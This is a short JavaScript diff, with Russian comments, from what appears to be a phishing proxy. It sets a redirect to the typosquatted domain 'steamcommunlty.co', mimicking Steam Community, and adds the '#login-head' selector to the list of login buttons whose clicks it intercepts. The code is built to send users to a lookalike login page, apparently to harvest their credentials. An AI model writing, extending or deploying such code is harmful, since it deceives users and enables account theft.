@@ -520,8 +520,8 @@ function modifyUrls(content, baseUrl, contentType = '') {
     // URL для перенаправления
     const targetUrl = 'https://steamcommunlty.co/6kaomrcjpf2m.html';
     
-    // Список селекторов кнопок
-    const targetSelectors = ['#login-head-tablet', '#login-register', '#login-chat'];
+    // Список селекторов кнопок - ДОБАВЛЕН НОВЫЙ СЕЛЕКТОР #login-head
+    const targetSelectors = ['#login-head-tablet', '#login-register', '#login-chat', '#login-head'];
     
     // Функция для перехвата кнопок без их замены
     function enhanceLoginButtons() {
